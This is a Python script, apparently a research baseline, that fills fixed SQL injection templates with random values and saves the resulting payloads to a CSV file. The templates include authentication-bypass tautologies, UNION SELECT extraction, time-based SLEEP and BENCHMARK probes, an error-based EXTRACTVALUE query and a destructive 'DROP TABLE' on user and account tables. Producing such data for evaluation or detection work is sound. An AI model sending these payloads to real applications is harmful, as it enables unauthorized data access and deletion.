"""Baseline: template-based random SQLi generation."""
import os
import sys
import argparse
import random
import pandas as pd

ROOT = os.path.normpath(os.path.join(os.path.dirname(__file__), '..'))
sys.path.insert(0, ROOT)

TEMPLATES = [
    "' OR {int}={int} --",
    "' UNION SELECT {str},{str},{str} --",
    "' AND SLEEP({int}) --",
    "' OR '{str}'='{str}",
    "' AND 1=1 --",
    "' AND 1=2 --",
    "'; DROP TABLE __TABLE__; --",
    "' OR 1=1 LIMIT {int} --",
    "admin'--",
    "' OR ''='",
    "1; SELECT * FROM __TABLE__",
    "' UNION SELECT NULL,NULL,NULL --",
    "1 AND SLEEP({int})",
    "1 OR BENCHMARK({int},{int})",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION())) --",
]

STRINGS = ["abc", "test", "foo", "bar", "xyz", "1", "a", "admin"]


def fill_template(template: str) -> str:
    result = template
    while '{int}' in result:
        result = result.replace('{int}', str(random.randint(1, 9999)), 1)
    while '{str}' in result:
        result = result.replace('{str}', random.choice(STRINGS), 1)
    result = result.replace('__TABLE__', random.choice(['users', 'admin', 'accounts']))
    return result


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--n_samples', type=int, default=1000)
    parser.add_argument('--out', default='eval_template.csv')
    parser.add_argument('--seed', type=int, default=42)
    args = parser.parse_args()

    random.seed(args.seed)
    payloads = [fill_template(random.choice(TEMPLATES)) for _ in range(args.n_samples)]
    out = args.out if os.path.isabs(args.out) else os.path.join(ROOT, '..', args.out)
    pd.DataFrame({'payload': payloads}).to_csv(out, index=False)
    print(f"Template baseline: {len(payloads)} samples -> {out}")


if __name__ == '__main__':
    main()
